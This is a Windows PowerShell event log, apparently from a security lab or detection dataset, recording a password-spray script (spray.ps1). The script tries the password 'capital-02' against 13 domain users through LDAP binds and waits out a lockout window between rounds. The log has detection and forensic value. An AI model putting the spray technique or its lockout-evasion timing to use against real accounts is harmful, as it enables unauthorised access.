<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4785,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Write-Host\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=608\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Write-Host\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4761,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=576\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, james.ponder, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4760,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=575\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4774,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=594\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4771,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=590\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4744,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=554\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4749,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=560\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, jim.johnson, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4786,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Write-Host\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=609\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Write-Host\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4758,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=572\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, ryan.lewis, capital-02\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4733,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Countdown-Timer\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=540\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Countdown-Timer\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4784,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Countdown-Timer\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=607\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Countdown-Timer\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=                Countdown-Timer -Seconds (60*$observation_window + $Fudge) -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4787,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=610\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n \r\n\r\nDetails: \r\nCommandInvocation(Write-Host): \"Write-Host\"\r\nParameterBinding(Write-Host): name=\"Object\"; value=\"False Waiting for 1 minutes. 60\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4732,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         Start-Sleep -Seconds $Seconds\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=538\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        Start-Sleep -Seconds $Seconds\r\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"60\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4740,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:     Write-Host \"[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())\"\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=548\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=    Write-Host \"[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())\"\r\n \r\n\r\nDetails: \r\nCommandInvocation(Write-Host): \"Write-Host\"\r\nParameterBinding(Write-Host): name=\"Object\"; value=\"[*] Now trying password capital-02 against 13 users. Current time is 1:48 PM\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:48:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288122,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4736,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Get-Date\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=543\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Get-Date\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=    $time = Get-Date\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288123,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657288182,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4103,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":106,"OpcodeValue":20,"RecordNumber":9941,"ActivityID":"{66883D06-FD3B-0001-B775-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"60\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = 42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n        Pipeline ID = 32\r\n        Command Name = Start-Sleep\r\n        Command Type = Cmdlet\r\n        Script Name = G:\\spray.ps1\r\n        Command Path = \r\n        Sequence Number = 615\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","Category":"Executing Pipeline","Opcode":"To be used when operation is just executing a method","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = 42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n        Pipeline ID = 32\r\n        Command Name = Start-Sleep\r\n        Command Type = Cmdlet\r\n        Script Name = G:\\spray.ps1\r\n        Command Path = \r\n        Sequence Number = 615\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Payload":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"60\"\r\n","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
